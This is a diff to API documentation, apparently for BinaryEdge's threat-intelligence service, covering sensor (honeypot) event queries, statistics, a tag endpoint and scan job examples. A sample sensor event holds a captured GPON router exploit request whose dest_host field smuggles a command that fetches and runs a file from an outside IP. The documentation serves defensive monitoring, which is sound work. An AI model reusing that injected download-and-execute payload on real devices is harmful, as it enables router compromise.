     "MX": ["mail.vit.press"]
-  },
-  (...)
-  ]
+  }]
 }
 ```
+
 
 ### Sensors
 
@@ -2117,47 +2274,46 @@ Details about an Scanner. List of recent events form the specified host, includi
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/sensors/ip/xxx.xxx.xxx.xxx' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/sensors/ip/xxx.xxx.xxx.xxx' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
 {
-    "query": "xxx.xxx.xxx.xxx",
-    "total": 1,
-    "targets_found": 1,
-    "events": [{
+  "query": "xxx.xxx.xxx.xxx",
+  "total": 1,
+  "targets_found": 1,
+  "events": [{
+    "port": 443,
+    "results": [{
+      "target": {
         "port": 443,
-        "results": [{
-            "target": {
-                "port": 443,
-                "protocol": "tcp"
-            },
-            "origin": {
-                "ts": 1549500839739,
-                "type": "sinkhole",
-                "ip": "xxx.xxx.xxx.xxx",
-                "rdns": "xxx.xxx.xxx.example.com"
-            },
-            "data": {
-                "payload": "POST /GponForm/diag_Form?style/ HTTP/1.1\\r\\nUser-Agent: Hello, World\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://185.244.25.98/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0",
-                "extra": {
-                    "http": {
-                        "method": "POST",
-                        "path": "/GponForm/diag_Form?style/",
-                        "version": "1.1",
-                        "headers": {
-                            "user-agent": "Hello, World",
-                            "accept": "*/*",
-                            "accept-encoding": "gzip, deflate",
-                            "content-type": "application/x-www-form-urlencoded"
-                        }
-                    }
-                },
-                "tags": ["HTTP_SCANNER"]
-            },
-            "@timestamp": "2019-02-07T00:54:00.422Z"
-        }]
+        "protocol": "tcp"
+      },
+      "origin": {
+        "ts": 1549500839739,
+        "type": "sinkhole",
+        "ip": "xxx.xxx.xxx.xxx",
+        "rdns": "xxx.xxx.xxx.example.com"
+      },
+      "data": {
+        "payload": "POST /GponForm/diag_Form?style/ HTTP/1.1\\r\\nUser-Agent: Hello, World\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://185.244.25.98/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0",
+        "extra": {
+          "http": {
+            "method": "POST",
+            "path": "/GponForm/diag_Form?style/",
+            "version": "1.1",
+            "headers": {
+              "user-agent": "Hello, World",
+              "accept": "*/*",
+              "accept-encoding": "gzip, deflate",
+              "content-type": "application/x-www-form-urlencoded"
+            }
+          }
+        },
+        "tags": ["HTTP_SCANNER"]
+      },
     }]
+  }]
 }
 ```
 
@@ -2168,65 +2324,66 @@ Events based on a Query. List of recent events for the given query, including de
 *Parameters*
 
 * query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
+* days: [Integer] Number of days to get the stats for. For example days=1 for the last day of data.
+    * Max: 60 (default)
 * page: [Int] Optional. Default 1
 * pagesize: [Int] Optional. Default 100
+* only_ips: [Int] Optional. If selected, only output origin IP addresses, target ports and protocols.
 
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/sensors/search?query=tags:ssh_scanner' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/sensors/search?query=tags:ssh_scanner' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
 {
-    "query": "tags:ssh_scanner",
-    "page": 1,
-    "pagesize": 20,
-    "total": 1117979,
-    "events": [{
-        "data": {
-            "payload": "SSH-2.0-PUTTY\\r\\n",
-            "extra": {
-                "ssh": {
-                    "description": "SSH-2.0-PUTTY"
-                }
-            },
-            "tags": ["SSH_SCANNER"]
-        },
-        "target": {
-            "port": 22,
-            "protocol": "tcp"
-        },
-        "origin": {
-            "ip": "218.92.1.153",
-            "type": "sinkhole",
-            "ts": 1549625590653,
-            "asn": 4134
+  "query": "tags:ssh_scanner",
+  "page": 1,
+  "pagesize": 20,
+  "total": 1117979,
+  "events": [{
+    "data": {
+      "payload": "SSH-2.0-PUTTY\\r\\n",
+      "extra": {
+        "ssh": {
+          "description": "SSH-2.0-PUTTY"
         }
-    }, {
-        "target": {
-            "port": 22,
-            "protocol": "tcp"
-        },
-        "data": {
-            "payload": "\\x00\\x00\\x02\\x84\\x07\\x14t\\x85\\x97.Sf\\x88\\xa3\\x1a\\x7f\\xf7:ZzG\\\\\\x00\\x00\\x00Ydiffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1\\x00\\x00\\x00\\x0fssh-rsa,ssh-dss\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00=@\\x8d71\\xc9&",
-            "extra": {
-                "ssh": {
-                    "hassh": "92674389fa1e47a27ddd8d9b63ecd42b",
-                    "hassh_algorithms": "diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none"
-                }
-            },
-            "tags": ["SSH_SCANNER"]
-        },
-        "origin": {
-            "ip": "58.242.83.31",
-            "type": "sinkhole",
-            "ts": 1549625585310,
-            "asn": 4837
-        }
+      },
+      "tags": ["SSH_SCANNER"]
     },
-    {...}
-    ]
+    "target": {
+      "port": 22,
+      "protocol": "tcp"
+    },
+    "origin": {
+      "ip": "218.92.1.153",
+      "type": "sinkhole",
+      "ts": 1549625590653,
+      "asn": 4134
+    }
+  }, {
+    "target": {
+      "port": 22,
+      "protocol": "tcp"
+    },
+    "data": {
+      "payload": "\\x00\\x00\\x02\\x84\\x07\\x14t\\x85\\x97.Sf\\x88\\xa3\\x1a\\x7f\\xf7:ZzG\\\\\\x00\\x00\\x00Ydiffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1\\x00\\x00\\x00\\x0fssh-rsa,ssh-dss\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00=@\\x8d71\\xc9&",
+      "extra": {
+        "ssh": {
+          "hassh": "92674389fa1e47a27ddd8d9b63ecd42b",
+          "hassh_algorithms": "diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none"
+        }
+      },
+      "tags": ["SSH_SCANNER"]
+    },
+    "origin": {
+      "ip": "58.242.83.31",
+      "type": "sinkhole",
+      "ts": 1549625585310,
+      "asn": 4837
+    }
+  }]
 }
 ```
 
@@ -2238,34 +2395,65 @@ Statistics of events for the given query. Can be used with specific parameters a
 
 * query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
 * type: [String] Type of statistic we want to obtain. Possible types include:
-    * _ports_, _tags_, _countries_, _asn_, _ips_, _payloads_, _http\_path_.
+    * _ports_, _tags_, _countries_, _asn_, _ips_, _payloads_, _http\_path_, _rdns_.
 * days: [Integer] Number of days to get the stats for. For example days=1 for the last day of data.
     * Max: 60 (default)
+* order: [String] Whether to sort descendently or ascendently to get the top.
+    * _desc_, _asc_
 
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/sensors/search/stats?query=tags:ssh_scanner&type=ports' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/sensors/search/stats?query=tags:ssh_scanner&type=ports' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
-[{
+[
+  {
     "key": "22/tcp",
     "doc_count": 1102752
-}, {
+  }, 
+  {
     "key": "2222/tcp",
     "doc_count": 8149
-}, {
+  }, 
+  {
     "key": "222/tcp",
     "doc_count": 1970
-}, {
+  }, 
+  {
     "key": "4000/tcp",
     "doc_count": 1962
-}, {
+  }, 
+  {
     "key": "23/tcp",
     "doc_count": 1552
-}]
+  }
+]
 ```
+
+#### /v1/query/sensors/tag/<tag>
+
+Get a list of IPs that have been associated with a specific TAG. See [List of Tags](sensors-tags.md)
+
+*Parameters*
+
+* tag: [String] Tag you want to get the list of IPs related to.
+    * example: MALICIOUS
+* days: [Integer] Query Param: Number of days to get the stats for. For example days=1 for the last day of data.
+    * Default: 1
+    * Max: 60
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/sensors/tag/MALICIOUS' -H 'X-Token:API_TOKEN'
+```
+
+```json
+["1.34.221.87", "1.160.38.189", "1.160.39.129", "1.160.91.241", "1.160.130.56", "1.160.160.98", "1.161.118.167"]
+```
+
 
 ### FAQ
 
@@ -2279,9 +2467,9 @@ curl 'https://api.binaryedge.io/v1/query/sensors/search/stats?query=tags:ssh_sca
 **A:** The stream outputs to STDOUT, allowing you to consume it in different ways. For example:
 
 - Direct the stream to a file:
-    - `curl 'https://stream.api.binaryedge.io/v1/stream' -H 'X-Token:InsertYourClientToken' > file.txt`
+    - `curl 'https://stream.api.binaryedge.io/v1/stream' -H 'X-Token:API_TOKEN' > file.txt`
 - Pipe the stream to a custom application you developed to process it:
-    - `curl 'https://stream.api.binaryedge.io/v1/stream' -H 'X-Token:InsertYourClientToken' | application_name `
+    - `curl 'https://stream.api.binaryedge.io/v1/stream' -H 'X-Token:API_TOKEN' | application_name `
 
 
 **Q: What should I do if I get a error 500?**
@@ -2293,14 +2481,14 @@ curl 'https://api.binaryedge.io/v1/query/sensors/search/stats?query=tags:ssh_sca
 
 **A:**
 
-```
+```json
 options: [{
-   "targets": [array of cidrs (string)],
-   "ports": [{
-       "port": int,
-       "modules": [array of module names (string)],
-       "sample": int
-   }]
+  "targets": ["array of cidrs (string)"],
+  "ports": [{
+    "port": "int",
+    "modules": ["array of module names (string)"],
+    "sample": "int"
+  }]
 }]
 ```
 
@@ -2308,26 +2496,26 @@ Example:
 
 ```json
 {
-   "type": "scan",
-   "description": "test a bunch of networks",
-   "options": [
-       {
-         "targets": ["xxx.xxx.x.x/xx","xxx.xxx.x.x/xx"],
-         "ports": [{
-            "port": 995,
-            "modules": ["service"]
-           },
-           {
-            "port": 22,
-            "modules": ["ssh"]
-           }]
-       }, {
-         "targets": ["xxx.xxx.x.x/xx"],
-         "ports": [{
-            "port": 5900,
-            "modules": ["vnc"]
-         }]
-       }
-     ]
+  "type": "scan",
+  "description": "test a bunch of networks",
+  "options": [
+    {
+      "targets": ["xxx.xxx.x.x/xx","xxx.xxx.x.x/xx"],
+      "ports": [{
+        "port": 995,
+        "modules": ["service"]
+      },
+      {
+        "port": 22,
+        "modules": ["ssh"]
+      }]
+    }, {
+      "targets": ["xxx.xxx.x.x/xx"],
+      "ports": [{
+        "port": 5900,
+        "modules": ["vnc"]
+      }]
+    }
+  ]
 }
 ```
